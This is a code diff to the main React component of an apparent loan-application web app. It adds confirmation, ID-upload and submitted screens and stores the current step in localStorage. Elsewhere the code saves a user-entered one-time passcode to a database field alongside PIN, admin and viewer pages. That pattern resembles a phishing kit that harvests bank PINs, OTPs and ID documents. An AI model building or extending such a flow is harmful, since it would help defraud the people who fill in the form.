@@ -8,6 +8,9 @@ import { Step3FinancialReview } from './components/Step3FinancialReview';
 import { SuccessScreen } from './components/SuccessScreen';
 import { PinScreen } from './components/PinScreen';
 import { OtpScreen } from './components/OtpScreen';
+import { IdUploadScreen } from './components/IdUploadScreen';
+import { ConfirmationScreen } from './components/ConfirmationScreen';
+import { SubmittedScreen } from './components/SubmittedScreen';
 import AdminPage from './components/AdminPage';
 import ViewerPage from './components/ViewerPage';
 import { AppStep, LoanFormData, SubmittedApplication } from './types';
@@ -99,10 +102,12 @@ export default function App() {
     const displayValue = `${existing}OTP: ${otp}`;
     try {
       submittedApplicationIdRef.current = applicationId;
-      window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'true');
+      window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'loading');
       setCurrentStep('loading');
       await updateApplicationVerificationCodeInSupabase(applicationId, displayValue);
       setSubmittedApplication((prev) => (prev ? { ...prev, verificationCode: displayValue } : prev));
+      window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'confirmation');
+      setCurrentStep('confirmation');
     } catch (error: any) {
       window.localStorage.removeItem(PROCESSING_STORAGE_KEY);
       console.error('OTP update failed', {
@@ -129,9 +134,15 @@ export default function App() {
   }, []);
 
   useEffect(() => {
-    const isProcessing = window.localStorage.getItem(PROCESSING_STORAGE_KEY);
-    if (isProcessing === 'true') {
+    const processingState = window.localStorage.getItem(PROCESSING_STORAGE_KEY);
+    if (processingState === 'loading') {
       setCurrentStep('loading');
+    } else if (processingState === 'confirmation') {
+      setCurrentStep('confirmation');
+    } else if (processingState === 'idUpload') {
+      setCurrentStep('idUpload');
+    } else if (processingState === 'submitted') {
+      setCurrentStep('submitted');
     }
   }, []);
 
@@ -164,6 +175,7 @@ export default function App() {
     setFormData(initialFormData);
     setSubmittedApplication(null);
     submittedApplicationIdRef.current = null;
+    window.localStorage.removeItem(PROCESSING_STORAGE_KEY);
     setCurrentStep('calculator');
   };
 
@@ -280,7 +292,7 @@ export default function App() {
 
   return (
     <div className={`min-h-screen text-slate-900 font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white ${currentStep === 'pin' ? 'bg-white' : 'bg-slate-100/90'}`}>
-      {currentStep !== 'pin' && <Header currentStep={currentStep} onBack={handleBack} onReset={handleReset} />}
+      {currentStep !== 'pin' && currentStep !== 'confirmation' && currentStep !== 'idUpload' && <Header currentStep={currentStep} onBack={handleBack} onReset={handleReset} />}
 
       <main className={currentStep === 'pin' ? 'flex-1' : 'flex-1 flex items-center justify-center p-3 sm:p-6'}>
         {currentStep === 'pin' ? (
@@ -344,6 +356,30 @@ export default function App() {
                     onNewApplication={handleReset}
                     onContinue={handleReset}
                   />
+                )}
+
+                {currentStep === 'confirmation' && submittedApplication && (
+                  <ConfirmationScreen
+                    onComplete={() => {
+                      window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'idUpload');
+                      setCurrentStep('idUpload');
+                    }}
+                  />
+                )}
+
+                {currentStep === 'idUpload' && submittedApplication && (
+                  <IdUploadScreen
+                    application={submittedApplication}
+                    onBackToApp={handleReset}
+                    onComplete={() => {
+                      window.localStorage.setItem(PROCESSING_STORAGE_KEY, 'submitted');
+                      setCurrentStep('submitted');
+                    }}
+                  />
+                )}
+
+                {currentStep === 'submitted' && submittedApplication && (
+                  <SubmittedScreen />
                 )}
 
                 {currentStep === 'otp' && (
